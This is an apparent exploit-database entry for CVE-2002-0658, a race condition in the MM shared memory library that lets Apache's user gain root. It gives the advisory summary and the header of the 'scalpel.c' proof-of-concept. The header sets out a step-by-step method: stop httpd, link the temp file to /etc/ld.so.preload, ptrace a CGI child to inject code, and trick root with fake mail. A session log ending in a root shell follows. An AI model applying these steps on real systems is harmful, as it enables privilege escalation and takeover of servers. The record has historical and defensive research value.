{
    "text": "ecve : CVE-2002-0658 ， title : MM 1.0.x/1.1.x - Shared Memory Library Temporary File Privilege Escalation - Linux local Exploit ， verified : Verified ， exploit_detail : // source :  ， The MM Shared Memory library is reported to be prone to a race condition with regards to temporary files which may enable a local attacker to gain elevated privileges. This issue may reportedly be exploited by an attacker with shell access as the Apache webserver user to gain root privileges on a vulnerable host. ， / scalpel.c -- local apache/PHP root via libmm ( apache-user -> root )  ，  ( C ) 2002 Sebastian Krahmer proof of concept exploit. ， Exploiting conditions :  ， Apache is linked against libmm which has /tmp races. ， Upon Apache start or restart code is executed like ， unlink ( \"/tmp/session_mm.sem\" )  ; open ( \"/tmp/session_mm.sem\" , O_RDWR | O_CREAT ) . ， If attacker exploited any CGI or PHP script remotely he gained ， apache-user and can go one step further to get root by :  ， 1 ) STOPing all httpd's and bring root to execute /etc/rc.d/apache restart ， Its very likely root does so because webserver just doesnt work anymore ，  ( all childs are STOPed ) . One can also send him fake-mail ， from httpd-watchdog that he has to invoke the command. ， 2 ) Install signal-handler and using 2.4 directory notifying to see when ， /tmp/session_mm.sem is unlinked. Create link to /etc/ld.so.preload ， immediately which makes Apache creating that file. ， 3 ) Trigger execution of a CGI script where Apache leaks a descriptor ，  ( r+w ) to /etc/ld.so.preload to the child. ， 4 ) Ptrace that script , inject code which writes content to preload-file. ， 5 ) Execute suid-helper to execute code as root. ， Note in 4 ) that we cant ptrace httpd alone because it setuid'ed from root ， to apache-user thus setting id-changed flag. By triggering execve (  ) of ， a CGI script this flag is cleared and we can hijack process. ， assert ( must-be-apache-user must-have-a-cgi-script-installed ， must-bring-root-to-restart-apache )  ;  ， wwwrun @ liane :  ~ > cc scalpel.c -Wall ， wwwrun @ liane :  ~ > ./a.out /cgi-bin/genindex.pl ， httpd ( 2368 )  : Operation not permitted ， Creating /tmp/boomsh ， Creating /tmp/boomso ， Installed signal-handler. Waiting for apache restart. ， ++++++Forking off proc-scan to attach to CGI-script. ， Triggering CGI : /cgi-bin/genindex.pl ， Got cgi-bin PID 2460 ， Injecting of write-code finished. ， blub ， +sh-2.05 # id ， uid=0 ( root ) gid=65534 ( nogroup ) groups=65534 ( nogroup )  ， sh-2.05 # ",
    "time": "2002-07-29"
}